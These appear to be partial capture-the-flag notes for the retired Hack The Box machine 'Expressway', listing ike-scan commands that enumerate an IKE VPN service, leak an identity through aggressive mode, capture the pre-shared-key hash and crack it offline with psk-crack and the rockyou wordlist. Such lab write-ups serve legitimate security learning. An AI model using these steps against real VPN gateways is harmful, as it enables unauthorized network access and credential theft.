# Expressway

> Retired Hack The Box machine. Partial research notes for authorized lab use only.

**Enumeration of vulnerability**
sudo ike-scan -M 10.10.11.87

**Result:**  Vendor IDs (XAUTH, Dead Peer Detection) were present.

**Try Aggressive to see if service leak identity**
sudo ike-scan -A 10.10.11.87

Result: Value=ike@expressway.htb


**PSK Cracking**
sudo ike-scan -M -a(agressive) 10.10.11.87 -n ike@expressway.htb --pskcrack=hash.txt

psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

**Result:** show password
